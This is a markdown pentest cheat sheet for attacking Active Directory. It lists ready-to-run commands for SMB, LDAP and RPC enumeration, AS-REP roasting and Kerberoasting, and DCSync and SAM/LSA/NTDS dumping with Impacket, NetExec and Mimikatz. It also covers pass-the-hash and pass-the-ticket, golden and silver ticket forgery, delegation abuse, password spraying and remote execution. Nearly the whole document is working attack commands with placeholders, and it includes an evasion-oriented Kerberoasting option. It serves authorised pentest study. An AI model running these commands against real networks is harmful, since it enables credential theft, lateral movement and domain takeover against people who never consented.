# AD Pentest — Full Tool Command Reference

> This fills in the gaps from 01–05: deeper **SMB**, **LDAP**, **Impacket suite**, **Rubeus**, **Mono**, and **NetExec/CrackMapExec** command coverage. Use this as your "what are ALL the flags/subcommands" reference; use 00–05 for workflow/order.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<DC_IP>` | Domain Controller IP |
| `<TARGET_IP>` | Any target host IP |
| `<DOMAIN>` | Domain name, e.g. `corp.local` |
| `<USER>` / `<PASS>` | Credential pair |
| `<HASH>` | NT hash |
| `<SHARE>` | SMB share name |
| `<BASE_DN>` | LDAP base DN, e.g. `dc=corp,dc=local` |
| `<SPN_USER>` | Service account username (Kerberoasting target) |
| `<TICKET>` | `.kirbi` ticket file or base64 blob |

---

## 1. SMB — Full Reference

### 1.1 smbclient

```bash
# List shares (anonymous)
smbclient -L //<TARGET_IP> -N

# List shares (authenticated)
smbclient -L //<TARGET_IP> -U '<DOMAIN>\<USER>%<PASS>'

# Connect to a share
smbclient //<TARGET_IP>/<SHARE> -N
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>\<USER>%<PASS>'

# Non-interactive command execution against a share
smbclient //<TARGET_IP>/<SHARE> -U '<USER>%<PASS>' -c 'ls'
```

**Inside an smbclient session:**
```
smb: \> ls                     # list files
smb: \> cd <folder>            # change directory
smb: \> get <file>              # download file
smb: \> put <file>              # upload file
smb: \> mget *                  # download all files in current dir
smb: \> recurse ON               # enable recursive mode
smb: \> prompt OFF               # disable per-file confirmation
smb: \> mask ""                 # clear file mask (use with mget/recurse)
```

### 1.2 smbmap

```bash
smbmap -H <TARGET_IP>                              # anonymous
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'          # authenticated
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -r <SHARE>   # recurse a share
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -R <SHARE>   # recurse (deep)
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' --download '<SHARE>\path\file'
smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'  # execute command (if admin)
```

### 1.3 Nmap SMB NSE scripts

```bash
nmap -p445 --script smb-enum-shares <TARGET_IP>
nmap -p445 --script smb-enum-users <TARGET_IP>
nmap -p445 --script smb-os-discovery <TARGET_IP>
nmap -p445 --script smb-protocols <TARGET_IP>           # SMB version support (check for SMBv1)
nmap -p445 --script smb-vuln-ms17-010 <TARGET_IP>        # EternalBlue check
nmap -p445 --script smb-enum-domains <TARGET_IP>
nmap -p445 --script smb-enum-sessions <TARGET_IP>
```

### 1.4 rpcclient — extended command list

```bash
rpcclient -U "" -N <TARGET_IP>             # null session
rpcclient -U '<USER>%<PASS>' <TARGET_IP>    # authenticated
```

**Inside rpcclient:**
```
rpcclient $> enumdomusers          # list domain users
rpcclient $> enumdomgroups         # list domain groups
rpcclient $> querydominfo          # domain info (SID, policy)
rpcclient $> getdompwinfo          # password policy
rpcclient $> queryuser <RID>       # user detail by RID
rpcclient $> querygroup <RID>      # group detail by RID
rpcclient $> queryusergroups <RID> # groups a user belongs to
rpcclient $> lookupnames <name>    # name → SID
rpcclient $> lookupsids <SID>      # SID → name
rpcclient $> enumdomains           # list domains
rpcclient $> netshareenum          # list shares
rpcclient $> srvinfo                # server info
```

---

## 2. LDAP — Full ldapsearch Reference

### 2.1 Anonymous bind test

```bash
ldapsearch -x -H ldap://<DC_IP> -s base
```

### 2.2 Authenticated bind

```bash
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>"
```
- `-D` → bind DN (simple auth, usually `user@domain` or full DN)
- `-w` → password (use `-W` to prompt instead of plaintext on CLI)
- `-b` → search base

### 2.3 Common useful filters

```bash
# All person objects
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(objectClass=person)"

# All users
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(objectCategory=person)(objectClass=user)"

# All computers
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(objectCategory=computer)"

# All groups
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(objectCategory=group)"

# Accounts with Kerberos pre-auth disabled (AS-REP roastable)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# Accounts with an SPN set (Kerberoastable)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(servicePrincipalName=*)"

# Domain Admins group members
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(&(objectClass=group)(cn=Domain Admins))" member

# Unconstrained delegation hosts
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Return only specific attributes
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b "<BASE_DN>" "(objectClass=user)" sAMAccountName memberOf description
```

### 2.4 windapsearch / ldapdomaindump (helper tools)

```bash
# windapsearch - quick domain admin enumeration
python3 windapsearch.py -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASS>' --dc-ip <DC_IP> -DA

# ldapdomaindump - full HTML/JSON dump of the domain
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' <DC_IP>
```

---

## 3. Impacket Suite — Extended Reference

Impacket is a Python toolkit; nearly every script accepts credentials in one of three forms:
```
<DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>       # password
<DOMAIN>/<USER>@<TARGET_IP> -hashes :<HASH> # NT hash (pass-the-hash)
<DOMAIN>/<USER>@<TARGET_IP> -k -no-pass     # Kerberos ticket (from ccache, needs KRB5CCNAME env var)
```

### 3.1 GetNPUsers.py — AS-REP Roasting

```bash
# With a userlist, no creds needed
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass

# With one valid credential, enumerate ALL accounts automatically (no userlist needed)
GetNPUsers.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -format hashcat -outputfile hashes.txt
```

### 3.2 GetUserSPNs.py — Kerberoasting

```bash
# List SPN accounts only
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>

# Request + dump crackable TGS hashes for ALL SPN accounts
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request -format hashcat -outputfile tgs_hashes.txt

# Target a single SPN account
GetUserSPNs.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request-user <SPN_USER>
```
Crack with: `hashcat -m 13100 tgs_hashes.txt <WORDLIST>`

### 3.3 secretsdump.py

```bash
# Local SAM/LSA dump (local admin creds)
secretsdump.py <TARGET>/<USER>:'<PASS>'@<TARGET_IP> -output local_dump

# Pass-the-hash
secretsdump.py -hashes :<HASH> <TARGET>/<USER>@<TARGET_IP>

# DCSync — full domain dump (needs DA-equivalent rights / replication rights)
secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc -output dc_dump

# DCSync a single user only
secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc-user <TARGET_USER>

# From an offline NTDS.dit + SYSTEM hive copy
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### 3.4 Remote execution scripts

```bash
psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>
wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>
smbexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>
atexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP> '<cmd>'
dcomexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>

# Pass-the-hash variant (works with all the above — swap :'<PASS>' for -hashes)
wmiexec.py -hashes :<HASH> <DOMAIN>/<USER>@<TARGET_IP>
```

### 3.5 Ticket-related scripts

```bash
# Craft a Golden Ticket (needs krbtgt hash)
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> <USER>

# Craft a Silver Ticket (needs target service account hash)
ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -spn <SPN> <USER>

# Request a TGT and save as ccache (for -k Kerberos auth)
getTGT.py <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache

# Convert between kirbi (Windows/Rubeus) and ccache (Linux/Impacket) formats
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi
```

### 3.6 Other useful Impacket scripts

```bash
lookupsid.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>       # RID brute-force via SID lookups
samrdump.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>         # SAM enumeration over SAMR
mssqlclient.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>       # MSSQL client (incl. xp_cmdshell abuse)
ntlmrelayx.py -t <TARGET_IP> -smb2support                 # NTLM relay attack
rpcdump.py <TARGET_IP>                                    # enumerate exposed RPC endpoints
Get-GPPPassword.py / findDelegation.py                    # GPP cpassword / delegation enum (var. by distro)
```

---

## 4. Rubeus — Full Command Reference (Windows)

> Run on a Windows host (domain-joined or `runas /netonly`). Needs .NET — see §5 for running it on Linux via Mono.

### 4.1 AS-REP Roasting

```powershell
Rubeus.exe asreproast                                   # all vulnerable accounts
Rubeus.exe asreproast /user:<SPN_USER>                   # single user
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### 4.2 Kerberoasting

```powershell
Rubeus.exe kerberoast                                    # all SPN accounts
Rubeus.exe kerberoast /user:<SPN_USER>                    # single account
Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt
Rubeus.exe kerberoast /rc4opsec                           # only RC4-supporting SPNs (stealthier, matches AES-downgrade detection evasion)
```

### 4.3 Ticket operations

```powershell
Rubeus.exe tgtdeleg                                       # request a TGT via S4U trick, no admin needed
Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /ptt            # Overpass-the-Hash: get TGT from NT hash, inject into session
Rubeus.exe asktgt /user:<USER> /aes256:<AES_KEY> /ptt      # same, using AES key instead of RC4/NTLM
Rubeus.exe ptt /ticket:<TICKET>                            # Pass-the-Ticket: inject a .kirbi into current session
Rubeus.exe renew /ticket:<TICKET>                          # renew a TGT
Rubeus.exe describe /ticket:<TICKET>                       # parse/show ticket contents
Rubeus.exe dump                                            # dump tickets from current session (like klist but more detail)
Rubeus.exe triage                                          # quick overview of all cached tickets
Rubeus.exe purge                                           # clear all cached tickets
```

### 4.4 Delegation abuse

```powershell
Rubeus.exe s4u /user:<USER> /rc4:<HASH> /impersonateuser:<TARGET_USER> /msdsspn:<SPN> /ptt
```
Used for constrained-delegation abuse (S4U2Self/S4U2Proxy chaining).

### 4.5 Monitoring (for unconstrained delegation boxes)

```powershell
Rubeus.exe monitor /interval:5 /filteruser:<TARGET_USER>   # watch for TGTs landing in LSASS, harvest automatically
```

---

## 5. Mono — Running Windows .exe Tools from Linux

Mono lets you run .NET binaries (Rubeus.exe, SharpHound.exe, etc.) **from a Linux attack box** without a Windows host — useful when you only have a Linux pivot/foothold.

```bash
# Install (Kali/Debian-based)
sudo apt install mono-complete

# Run a .NET executable through Mono
mono Rubeus.exe asreproast
mono SharpHound.exe --CollectionMethods All --Domain <DOMAIN> --ExcludeDCs
mono Certify.exe find /vulnerable
```

**Caveats:**
- Mono support for some P/Invoke-heavy Windows API calls is incomplete — tools that need deep Win32 interop (e.g. certain mimikatz modules) may not run correctly under Mono.
- Networking (Kerberos auth to the DC) generally works fine since it's standard socket/LDAP/Kerberos traffic, not Win32-specific.
- Prefer native Linux equivalents when available (Impacket covers most of what Rubeus/SharpHound do): `GetNPUsers.py`≈`Rubeus asreproast`, `GetUserSPNs.py`≈`Rubeus kerberoast`, `bloodhound-python`≈`SharpHound.exe`.

---

## 6. NetExec (nxc) / CrackMapExec — Extended Flags

### 6.1 Core auth test

```bash
nxc smb <TARGET_IP> -u <USER> -p '<PASS>'
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>
nxc smb <TARGET_IP> -u <USER> -H <HASH> --local-auth     # local account hash
nxc smb <TARGET_IP> -u <USER> -H <HASH>                   # domain account hash
```

### 6.2 Enumeration modules (`-M` / built-ins)

```bash
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares         # list shares + perms
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users           # list domain users
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups           # list domain groups
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --loggedon-users    # who's logged in
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol           # password policy
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam                # dump SAM (admin)
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --lsa                # dump LSA secrets (admin)
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --ntds                # DCSync-style NTDS dump (DA rights)
nxc ldap <TARGET_IP> -u <USER> -p '<PASS>' --bloodhound --collection All   # BloodHound data collection via LDAP
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus         # crawl + index all shares
```

### 6.3 Spraying

```bash
nxc smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success
nxc smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success --jitter 2-5
nxc smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success --no-bruteforce  # 1 pass, not full matrix
```

### 6.4 Command execution

```bash
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami /all'     # cmd.exe
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -X '$PSVersionTable'  # PowerShell
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --exec-method wmiexec  # choose exec backend
```

### 6.5 Multi-protocol support

```bash
nxc ldap <TARGET_IP> -u <USER> -p '<PASS>'
nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'
nxc rdp <TARGET_IP> -u <USER> -p '<PASS>'
nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'
nxc ssh <TARGET_IP> -u <USER> -p '<PASS>'
```

---

## 7. Mimikatz — Extended Module Reference

(Complements §4 of `04-AD-Credential-Harvesting.md`)

```
mimikatz # privilege::debug                 # enable SeDebugPrivilege (do this first, almost always)
mimikatz # sekurlsa::logonpasswords         # dump creds from LSASS
mimikatz # sekurlsa::tickets /export        # export Kerberos tickets from memory as .kirbi
mimikatz # sekurlsa::pth /user:<U> /domain:<D> /ntlm:<HASH> /run:cmd.exe   # Overpass-the-Hash
mimikatz # lsadump::sam                     # local SAM hashes (needs saved hives or SYSTEM)
mimikatz # lsadump::secrets                 # LSA secrets
mimikatz # lsadump::cache                   # MSCacheV2/DCC2
mimikatz # lsadump::dcsync /user:<U> /domain:<D>    # DCSync a single user (needs replication rights)
mimikatz # lsadump::dcsync /all /csv                # DCSync the whole domain
mimikatz # kerberos::list                   # list cached Kerberos tickets
mimikatz # kerberos::ptt <TICKET>           # Pass-the-Ticket
mimikatz # kerberos::purge                  # clear ticket cache
mimikatz # vault::list                      # list DPAPI vaults
mimikatz # vault::cred /export               # export vault creds
mimikatz # dpapi::masterkey /in:<file> /rpc  # decrypt a DPAPI masterkey
mimikatz # token::list                      # list available tokens
mimikatz # token::elevate                   # steal SYSTEM token
```

---

## 8. Quick Cross-Reference — "I have X, what can I do?"

| You have | Tool / Command |
|---|---|
| Just a username list, no creds | `GetNPUsers.py ... -no-pass` (AS-REP roast attempt) |
| One valid domain credential | `GetUserSPNs.py ... -request` (Kerberoast), `bloodhound-python`, `nxc smb --shares/--users/--groups` |
| Local admin on a box | `secretsdump.py` (local), `mimikatz sekurlsa::logonpasswords`, `lsadump::sam` |
| An NT hash (not Net-NTLMv2) | `psexec.py -hashes :<HASH>`, `evil-winrm -H <HASH>`, `nxc ... -H <HASH>` |
| A `.kirbi` ticket | `Rubeus.exe ptt /ticket:` or `mimikatz kerberos::ptt`, convert with `ticketConverter.py` for Linux use |
| DA-equivalent / replication rights | `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync /all` |
| Only Linux, need Windows .exe tools | Run via `mono <tool>.exe`, or use the Impacket/bloodhound-python equivalent instead |
